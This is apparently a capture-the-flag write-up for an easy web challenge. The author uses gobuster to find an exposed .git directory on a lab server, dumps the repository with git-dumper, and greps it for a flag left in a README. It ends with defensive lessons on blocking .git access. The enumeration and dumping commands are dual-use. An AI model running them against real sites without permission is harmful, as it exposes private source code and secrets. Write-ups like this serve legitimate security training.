## Day - 2

**Challenge name:** Concierge Briefing

**Category:** Web Exploitation / Source Code Exposure

**Difficulty:** Easy

**Date completed:** 29th of July 2026

---

## Summary

The challenge picks up where Day 1 left off - the Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website. The task for us is to dump the exposed source code and find the flag.

---

### Step 1: Recon

The target web service appears minimal from the homepage but we can expect some hidden paths. So I did a quick check to see if i can find anything exposed on the server using gobuster:

```bash
gobuster dir -u http://10.48.185.161:8080/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

Output:

```bash
Starting gobuster in directory enumeration mode
===============================================================
.git                 (Status: 200) [Size: 437]
.git/index           (Status: 200) [Size: 289]
.git/config          (Status: 200) [Size: 92]
.git/HEAD            (Status: 200) [Size: 21]
.git/logs/           (Status: 200) [Size: 165]
Progress: 4751 / 4751 (100.00%)
```

This indicates an exposed git directory present on the web server.

---

### Step 2: Dumping the repository

To dump the repository I used **git-dumper**, If not installed then:

```python
pipx install git-dumper
```

Then dump the repository:

```bash
git-dumper http://10.48.185.161:8080/.git ./bytelotus
```

This gave me a local git repository to work with.

---

### Step 3: Searching for string

Instead of manually checking everything I used the grep to see if i can find the flag:

```bash
grep -Rni "THM{" .
```

./README.md:6:Staging flag (remove before launch): [REDACTED]

The flag was found in README.md.

---

### Lessons Learned

- Exposed .git directories can leak an application's source code and sensitive files.
- Tools like Gobuster and git-dumper make it easy to discover and retrieve exposed Git repositories.
- Developers should block access to .git directories and remove sensitive information from repositories before deployment.
- Simple misconfigurations can expose confidential data, emphasizing the importance of secure deployment practices.
